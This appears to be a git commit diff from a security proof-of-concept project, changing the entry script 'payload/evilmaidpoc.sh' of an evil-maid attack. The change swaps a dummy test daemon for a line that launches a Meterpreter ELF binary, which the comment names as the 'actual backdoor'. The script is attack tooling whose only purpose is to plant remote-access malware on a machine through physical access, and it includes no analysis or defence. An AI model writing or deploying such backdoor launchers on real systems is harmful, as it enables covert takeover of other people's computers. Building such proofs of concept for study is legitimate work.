f25138aad904bf47d32d113eee4b8646730ff38d
tavog96 <31905549+tavog96@users.noreply.github.com>
2025-02-08 05:20:35 -0800

    mterpreter payload updated

--- payload/evilmaidpoc.sh
+++ payload/evilmaidpoc.sh
@@ -1,2 +1,9 @@
-#Just the payload entry point
-sh /opt/uisil/cib10/dummyDeamon.sh
+#!/bin/bash
+
+# Just the payload entry point
+
+# Dummy deamon for testing purpose
+# sh /opt/uisil/cib10/dummyDeamon.sh
+
+# Meterpreter deamon for actual backdoor
+/opt/uisil/cib10/meterpreter.elf
